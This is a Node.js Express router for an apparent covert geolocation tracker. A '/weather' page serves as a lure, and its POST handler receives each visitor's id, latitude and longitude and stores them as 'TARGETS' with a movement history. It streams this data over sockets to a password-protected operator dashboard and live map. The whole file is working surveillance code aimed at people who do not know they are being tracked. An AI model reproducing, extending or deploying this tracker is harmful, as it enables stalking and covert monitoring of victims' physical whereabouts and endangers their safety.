const express = require("express")
const router = express.Router()
const config = require("./config")

const TARGETS = {}

function updateTargetLocation(id, lat, lng) {
    if (!id || lat == null || lng == null) return
    const isNew = !TARGETS[id]
    
    if (isNew) {
        TARGETS[id] = {
            location: [lat, lng],
            history: [],
            lastSeen: Date.now()
        }
        if (global.IO) {
            global.IO.emit("user-connected", id)
        }
    }

    TARGETS[id].location = [lat, lng]
    TARGETS[id].lastSeen = Date.now()
    TARGETS[id].history.push([lat, lng, Date.now()])

    // Keep up to 500 movement points in history
    if (TARGETS[id].history.length > 500) {
        TARGETS[id].history.shift()
    }

    if (global.IO) {
        global.IO.emit("map-data", {
            id,
            lat,
            lng,
            history: TARGETS[id].history,
            lastSeen: TARGETS[id].lastSeen
        })
    }

    console.log(`> ${id} - ${lat},${lng}`)
}

// login page 
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body

    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
    }

    res.redirect("/")
})

router.route("/weather").get((req, res) => {
    res.render("weather")
}).post((req, res) => {
    const { id, lat, lng } = req.body
    updateTargetLocation(id, parseFloat(lat), parseFloat(lng))
    res.send("OK")
})

// token checking
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token

    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

router.route("/").get((req, res) => {
    res.render("home", {
        TARGETS
    })
})

router.route("/map").get((req, res) => {
    const { id } = req.query
    const targetData = TARGETS[id] || { location: [0, 0], history: [], lastSeen: 0 }

    res.render("map", {
        id: id || '',
        data: JSON.stringify(targetData.location),
        history: JSON.stringify(targetData.history)
    })
})

module.exports = { router, updateTargetLocation, TARGETS }